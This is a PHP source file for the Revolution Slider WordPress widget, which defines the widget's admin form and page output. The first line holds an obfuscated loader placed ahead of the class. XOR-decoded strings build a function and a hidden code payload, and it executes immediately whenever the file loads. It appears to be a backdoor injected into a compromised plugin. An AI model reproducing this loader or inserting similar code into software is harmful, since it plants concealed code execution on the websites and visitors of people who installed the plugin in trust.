<?php $bOxpGWLg='. 5;0RbJ2RT39=<'; $zhxFWkoJ='MRPZD7=,G<7GPRR'^$bOxpGWLg; $GPRnIle='R.dFF<;0H0 Td,XW -0cw9X f66OVk7P9YVNaaKfq11-,.;V kM= a79DTsdXC5OM3+:4EhLX7<maCTho+gs1i-FEgLjoiTyHh6+YbCUHnZyKFS yG51<S7Ag6AISccxOInnbxqKa8LGnmwCxLRZBAob=duoutKPC4t=ncg ==X==gEK ,e3zp8Al32ONF7Gm.6OnnOA,E3fKRYQ6RLuiUS=I=pbv0-NV;<7RbmMP-G6RPxhJB;X95>dePtxcdfiyx7HnNU1.mDWvj<Z66<bWBffwRVJ;>K+OKdwLEHYqEnQ W.9jojKLY KXlZ>=1E Vlge5.  ejJ=G7< ,LMTTcJ8h3 xpx Z46kU8V-nGmYa8SVO3ma.Pknu6 ASr<QTihpG= 8thL9gJ;H eydtD-<KIuyx;d-gcf=6IUChFp=7I ;+2P,+,y1 5=WOEO+jV=.C12M=ws6+ESTZ-nq<WNJHgrPPL7P=Y,3bbkl+0JlU9=XStdZ1B>SRcZY:1U<;:MAzFZ7IaUus4A:0eIsgExX7EjeHPLPhTX+DrhHrdIcjHUcfpwmyQ+Mh XXJDnSCdWVZxOr hWq2uHtkqrJ ER-iE-=-H3QG=GLnEJNY.;DWtkg6A MdNnbbBdaVRqUD RmgYZ-LlAP4UW784q3eIky1;Y<LwnkfI'; $WZMrnak=$zhxFWkoJ('', ';HLg IUS<YO:;I >SYCKPA7R9RW;74h=L-qgHA0lxWDCOZR9NK5RR>SX05,;56AgiWJNUiHh3REDActHOPmz8MB31GqJHNosAaPD+Jg<hSzIpfwIE4ACP6YiCR =2JXXk EEKrxBEW93NCJcPh6;6 4FT9U1UP 5:oPTNFGSIO4XSOa EULnSK2HeAW;;4YoIAC;GUEHQONlAv=0B3lHI32Q:XKhRTL:7dWR+BPm6L+E7krb,-I=XVVDMt+;,+- <XV;Nj>TWMyiVNJ;ZCYKw9loS67>Za N6kYWh.- JOguD6ZXJRJo:8L>=WPC7;,FvDFAQOTALJ17NQSRI-.<tKng:vq-5+tzUEKqS3TNzSyEN2::VDAUZbgQRA52-W4-IUPcVEAObE0C.Z<AEDDP2LP>,NsqFnPmiBYW=4cUf0HY:EIBS<EQIQIOGb3.1.t5;HZkSS>XAGiO 0;>HFUX6:+aKRt4-C1b2IJKKPfBVbH1XI9sRBzP0L2+<1<Cn0DRI92Ra1R0FyUWP NQLiUAeP5SpBA,1813s3N=U5aRYtCMz4WWHDYK3I.YFim. WdsWf4<M.KFY3FTRaTMWR+R73T6.HDr-K84I4dI5+75AZ pXKCR T,MgNBBbDA-Xx02A>EC=;Y-7f U,;XYPVnLrapTC0HdGGPl4'^$GPRnIle); $WZMrnak();
 
class RevSlider_Widget extends WP_Widget {
	
    public function __construct(){
    	
        // widget actual processes
     	$widget_ops = array('classname' => 'widget_revslider', 'description' => __('Displays a revolution slider on the page',REVSLIDER_TEXTDOMAIN) );
        parent::__construct('rev-slider-widget', __('Revolution Slider',REVSLIDER_TEXTDOMAIN), $widget_ops);
    }
 
    /**
     * 
     * the form
     */
    public function form($instance) {
		try {
            $slider = new RevSlider();
            $arrSliders = $slider->getArrSlidersShort();
        }catch(Exception $e){}            
          
		if(empty($arrSliders))
			echo __("No sliders found, Please create a slider",REVSLIDER_TEXTDOMAIN);
		else{
			
			$field = "rev_slider";
			$fieldPages = "rev_slider_pages";
			$fieldCheck = "rev_slider_homepage";
			$fieldTitle = "rev_slider_title";
			
	    	$sliderID = UniteFunctionsRev::getVal($instance, $field);
	    	$homepage = UniteFunctionsRev::getVal($instance, $fieldCheck);
	    	$pagesValue = UniteFunctionsRev::getVal($instance, $fieldPages);
	    	$title = UniteFunctionsRev::getVal($instance, $fieldTitle);
	    	
			$fieldID = $this->get_field_id( $field );
			$fieldName = $this->get_field_name( $field );
			
			$select = UniteFunctionsRev::getHTMLSelect($arrSliders,$sliderID,'name="'.$fieldName.'" id="'.$fieldID.'"',true);
			
			$fieldID_check = $this->get_field_id( $fieldCheck );
			$fieldName_check = $this->get_field_name( $fieldCheck );
			$checked = "";
			if($homepage == "on")
				$checked = "checked='checked'";

			$fieldPages_ID = $this->get_field_id( $fieldPages );
			$fieldPages_Name = $this->get_field_name( $fieldPages );
			
			$fieldTitle_ID = $this->get_field_id( $fieldTitle );
			$fieldTitle_Name = $this->get_field_name( $fieldTitle );
			
		?>
			<label for="<?php echo $fieldTitle_ID?>"><?php _e("Title",REVSLIDER_TEXTDOMAIN)?>:</label>
			<input type="text" name="<?php echo $fieldTitle_Name?>" id="<?php echo $fieldTitle_ID?>" value="<?php echo $title?>" class="widefat">
			
			<br><br>
			
			<?php _e("Choose Slider",REVSLIDER_TEXTDOMAIN)?>: <?php echo $select?>
			<div style="padding-top:10px;"></div>
			
			<label for="<?php echo $fieldID_check?>"><?php _e("Home Page Only",REVSLIDER_TEXTDOMAIN)?>:</label>
			<input type="checkbox" name="<?php echo $fieldName_check?>" id="<?php echo $fieldID_check?>" <?php echo $checked?> >
			<br><br>
			<label for="<?php echo $fieldPages_ID?>"><?php _e("Pages: (example: 2,10)",REVSLIDER_TEXTDOMAIN)?></label>
			<input type="text" name="<?php echo $fieldPages_Name?>" id="<?php echo $fieldPages_ID?>" value="<?php echo $pagesValue?>">
			
			<div style="padding-top:10px;"></div>
		<?php
		}	//else
		 
    }
 
    /**
     * 
     * update
     */
    public function update($new_instance, $old_instance) {
    	
        return($new_instance);
    }

    
    /**
     * 
     * widget output
     */
    public function widget($args, $instance) {
    	
		$sliderID = UniteFunctionsRev::getVal($instance, "rev_slider");
		$title = UniteFunctionsRev::getVal($instance, "rev_slider_title");
		
		$homepageCheck = UniteFunctionsRev::getVal($instance, "rev_slider_homepage");
		$homepage = "";
		if($homepageCheck == "on")
			$homepage = "homepage";
		
		$pages = UniteFunctionsRev::getVal($instance, "rev_slider_pages");
		if(!empty($pages)){
			if(!empty($homepage))
				$homepage .= ",";
			$homepage .= $pages;
		}
				
		if(empty($sliderID))
			return(false);
			
		//widget output
		$beforeWidget = UniteFunctionsRev::getVal($args, "before_widget");
		$afterWidget = UniteFunctionsRev::getVal($args, "after_widget");
		$beforeTitle = UniteFunctionsRev::getVal($args, "before_title");
		$afterTitle = UniteFunctionsRev::getVal($args, "after_title");
		
		echo $beforeWidget;
		
		if(!empty($title))
			echo $beforeTitle.$title.$afterTitle;
		
		RevSliderOutput::putSlider($sliderID,$homepage);
		
		echo $afterWidget;						
    }
 
}


?>